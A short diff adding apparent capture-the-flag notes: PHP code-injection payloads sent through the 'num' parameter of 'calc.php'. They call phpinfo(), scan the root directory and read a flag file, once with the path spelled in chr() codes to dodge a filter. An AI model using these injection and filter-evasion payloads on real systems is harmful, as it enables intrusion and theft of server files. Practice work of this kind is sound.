@@ -1,0 +1,4 @@
+calc.php? num=phpinfo();
+扫描根目录scandir('/')
+? num=print_r(file_get_contents('/flagg'));
+? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));
